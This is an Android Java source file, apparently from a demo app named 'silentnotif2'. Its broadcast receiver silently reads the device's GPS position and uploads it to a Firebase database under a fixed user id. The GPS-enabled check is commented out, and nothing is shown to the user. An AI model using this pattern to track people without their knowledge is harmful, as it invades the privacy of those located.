package com.example.silentnotif2.Service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.example.silentnotif2.Utility.ClsGlobal;
import com.example.silentnotif2.firebase.FirebaseRealtimeDB;


public class LocationBroadcastReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        Log.e("Receiver", "onReceive call");

        String str = "";
        String LocationStatus = "";
        double latitude = 0.0;
        double longitude = 0.0;

        if (ClsGlobal.checkPermission(context)) {
            LocationStatus = LocationStatus.concat("Location Permission Granted ");
        } else {
            LocationStatus = LocationStatus.concat("Location Permission Not Granted ");
        }

        GPSTracker gps = new GPSTracker(context);
        // check if GPS enabled
        //if (gps.canGetLocation()) {

            latitude = gps.getLatitude();
            longitude = gps.getLongitude();

            str = "Your Locion is - \nLat: " + latitude
                    + "\nLog: " + longitude;

            LocationStatus = LocationStatus.concat("and Location is Enable. ");


            FirebaseRealtimeDB realtimeDB = new FirebaseRealtimeDB();
            realtimeDB.addLocation("user1",latitude+"",longitude+"",ClsGlobal.getCurruntDateTime());

        /*} else {
            LocationStatus = LocationStatus.concat("and Location is Not Enable. ");
        }*/

            Log.e("LocationStatus", LocationStatus);

            gps.stopUsingGPS();

    }
}
